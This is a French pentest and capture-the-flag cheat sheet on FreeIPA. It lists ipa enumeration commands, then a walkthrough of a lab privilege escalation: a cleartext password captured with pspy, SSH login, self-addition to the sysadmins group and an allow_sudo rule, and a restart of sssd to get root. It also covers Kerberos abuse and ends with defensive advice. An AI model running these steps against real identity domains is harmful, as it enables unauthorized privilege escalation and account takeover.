# IPA

***

### <mark style="color:red;">🧩 Qu’est-ce que FreeIPA ?</mark>

* FreeIPA = **Identity Management (IdM)** pour Linux, basé sur :
  * **LDAP** : annuaire d’utilisateurs / groupes.
  * **Kerberos** : authentification forte (tickets TGT/TGS).
  * **SSSD (System Security Services Daemon)** : lie un hôte Linux à FreeIPA pour auth centralisée.
  * **Sudo rules centralisées** : gestion fine des droits sudo à travers le domaine.
* C’est une **alternative open-source à Active Directory** (AD côté Windows).
* Cible fréquente en CTF / pentest car mal configurée = escalade directe.

***

### <mark style="color:red;">⚙️ Commandes de base (</mark><mark style="color:red;">`ipa`</mark> <mark style="color:red;"></mark><mark style="color:red;">CLI)</mark>

#### 🔎 Enumération

* Groupes existants :

```bash
ipa group-find
```

* Voir les utilisateurs et leurs groupes :

```bash
ipa user-find
ipa user-show <username> --all | grep 'Member of groups'
```

* Règles sudo :

```bash
ipa sudorule-find
ipa sudorule-show <rulename>
```

* Vérifier les sudo pour un user :

```bash
ipa sudorule-find --user=<username>
```

* Politiques de HBAC (Host-Based Access Control) :

```bash
ipa hbacrule-find
```

***

#### 🔑 Manipulation (si accès admin ou creds volés)

* Ajouter un user à un groupe :

```bash
ipa group-add-member <groupname> --users=<username>
```

* Ajouter un user à une règle sudo :

```bash
ipa sudorule-add-user <rulename> --users=<username>
```

* Créer un nouvel utilisateur :

```bash
ipa user-add hacker --first=Evil --last=Hacker --password
```

* Ajouter une clé SSH à un utilisateur :

```bash
ipa user-mod hacker --sshpubkey="ssh-rsa AAAAB3Nza..."
```

***

### <mark style="color:red;">🎯 Exemple d’escalade en CTF (ton cas)</mark>

1️⃣ **Énumération avec pspy**

```
pspy → UID=1638400000 CMD: /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

➡️ Tu chopes un mot de passe clair via une commande IPA exécutée automatiquement.

2️⃣ **Connexion SSH avec ces creds**

```bash
ssh ash_winter@10.129.2.68
```

3️⃣ **Vérification sudo local**

```bash
sudo -l
```

➡️ Autorisé à redémarrer `sssd` sans mot de passe.

4️⃣ **Exploration FreeIPA**

```bash
ipa group-find
ipa user-show ash_winter --all
ipa sudorule-find
```

➡️ Découverte d’un groupe `sysadmins` et d’une règle `allow_sudo` donnant accès total.

5️⃣ **Ajout de ton user au groupe sysadmins**

```bash
ipa group-add-member sysadmins --users=ash_winter
```

6️⃣ **Ajout du user à la règle sudo**

```bash
ipa sudorule-add-user allow_sudo --users=ash_winter
```

7️⃣ **Redémarrage de SSSD**

```bash
sudo systemctl restart sssd
```

8️⃣ **Root sans mot de passe**

```bash
sudo su -
```

***

### <mark style="color:red;">📚 Vecteurs d’attaque offensifs FreeIPA</mark>

#### 1. **Password recovery / capture**

* Commandes `ipa user-mod` vues via `pspy` ou `strace` → mot de passe en clair.
* LDAP bind avec comptes en clair stockés dans `/etc/sssd/sssd.conf`.

#### 2. **Abus de sudo rules**

* Règles mal configurées (ex: `allow_sudo` donnant `ALL=(ALL) ALL`).
* Ajout de soi-même à ces règles = **root domain-wide**.

#### 3. **Abus de groupes**

* Ajout à `admins` ou `sysadmins`.
* Exploitation de `ipa group-add-member` si tu as déjà un compte semi-privilégié.

#### 4. **Kerberos abuse**

* Dump tickets Kerberos (`klist`, `kinit`).
* Récupération de TGT/TGS → Pass-the-ticket.
* Si tu as `krbtgt` ou clé de la CA IPA → full domain compromise.

#### 5. **SSSD restart abuse**

* Si `sudo -l` autorise `systemctl restart sssd` → tu peux injecter des modifs IPA et les appliquer immédiatement.

***

### <mark style="color:red;">🔎 Différences clés avec Active Directory</mark>

* IPA = open source, intégré au monde Linux.
* Utilise **Kerberos natif** + **LDAP**.
* Pas de GPO comme AD, mais HBAC + sudo rules.
* Certificat CA interne (souvent réutilisable en MITM, comme ton cas précédent).

***

### <mark style="color:red;">🛡 Défense</mark>

* Restreindre qui peut utiliser `ipa` CLI (éviter comptes trop permissifs).
* Ne pas stocker de mots de passe en clair dans commandes automatisées.
* Vérifier les règles sudo IPA → éviter les `ALL` trop larges.
* Activer **2FA / OTP** pour comptes admins.
* Surveiller les ajouts suspects à des groupes critiques (`admins`, `sysadmins`).

***

### <mark style="color:red;">📚 Références</mark>

* [FreeIPA official docs](https://www.freeipa.org/)
* CWE-732: Incorrect Permission Assignment
* CWE-250: Execution with Unnecessary Privileges
* MITRE ATT\&CK T1078: Valid Accounts

***

✅ En résumé :

* FreeIPA = AD du monde Linux (LDAP + Kerberos + sudo central).
* Outil `ipa` = couteau suisse pour énumérer, modifier, escalader.
* Vecteurs classiques en CTF : mots de passe captés par pspy/strace, abus sudo rules, ajout dans sysadmins, redémarrage de `sssd`.

***
